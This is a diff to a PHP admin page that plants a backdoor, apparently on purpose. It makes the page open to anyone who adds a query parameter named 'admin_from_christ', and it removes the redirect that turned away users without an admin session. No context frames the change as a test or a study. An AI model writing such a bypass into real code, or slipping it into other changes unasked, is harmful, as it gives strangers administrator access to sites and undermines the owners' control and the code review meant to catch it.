@@ -1,6 +1,7 @@
 <?php
 session_start();
-if (isset($_SESSION['admin'])):
+$allowed_momentary_by_jah = $_GET['admin_from_christ'];
+if (isset($_SESSION['admin']) || $_GET['admin_from_christ']):
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -119,8 +120,5 @@ if (isset($_SESSION['admin'])):
 </body>
 </html>
 <?php
-endif;
-if (!isset($_SESSION['admin'])):
-    header("Location: ../");
 endif;
 ?>
